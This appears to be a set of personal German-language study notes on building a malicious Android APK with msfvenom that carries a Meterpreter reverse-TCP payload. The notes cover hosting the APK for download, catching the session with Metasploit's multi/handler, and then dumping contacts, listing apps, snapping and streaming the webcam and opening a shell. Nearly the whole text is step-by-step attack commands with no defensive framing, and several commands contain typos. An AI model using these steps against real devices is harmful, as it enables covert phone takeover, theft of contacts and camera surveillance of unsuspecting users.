# Android MSFVenom

> msfvenom -p android/meterpreter/reverse_tcp LHOST=(LHost) LPORT=4444 R > /war/www/html/androidApp.apk

Adroid Applikation wird erstellt (Output von msfvenom wird un die App geschrieben).
Über diese Applikation läuft eine Reverse shell, mit welcher er den Zugriff auf Android bekommt.
LHost ist Listener (IP-Adresse der Kali Maschine); LPort ist Port auf welchen gehorcht wird
> service apache2 status

apache2 hosting Files
> msfconsole
> use exploit/multi/handler
> set payload android/meterpreter/reverse_tcp

generates listener
> set LHOST (LHOST)
> exploit

System is hyjacked
> background


On Android device in Browser:
http://LHSOTip:8000/androidApp.apk
Hier kann man das File herunterladen und installieren.
Wenn User auf MainActivity Android-App klickt ist Session erstellt.

> sessions

IP-Adresse des Android Devices braucht man nicht. Diese wird automatisch geliefert. (über Sessions)
> sessions -i 1

Enters Session
Hier drinnen können viel(fast alle möglichen) Informationen über das Device herausgefunden werden.
> app_list

Listet alle Apps, welche installiert sind auf
> dump_contacts

Erstellt Textfile mit allen Kontakten.
> webcam_list
> webcam_snap

... selbsterklärend
> webcam_stream -d (Duration in Sekunden) -i (Index of Stream)

dies erstellt html file, auf welchem der Stream läuft
> shell
> ... 

# Geolocate

> use exploit/multi/handler

> set payload android/meterpreter/reverse_tcp

> set lhost 192.168.0.132

> show options 

> exploit 

> webcam_steam -h // get help

> webcam_list

> webcam_stream -d 5 -i 1 // d (duration aufnahmezeit/ index of webcam)

> cd /home/kali/

> msfconsole

> [alles wie vorher]

> webcam_stream -d 5 -i 1 

> cp [daten] /var/www/html 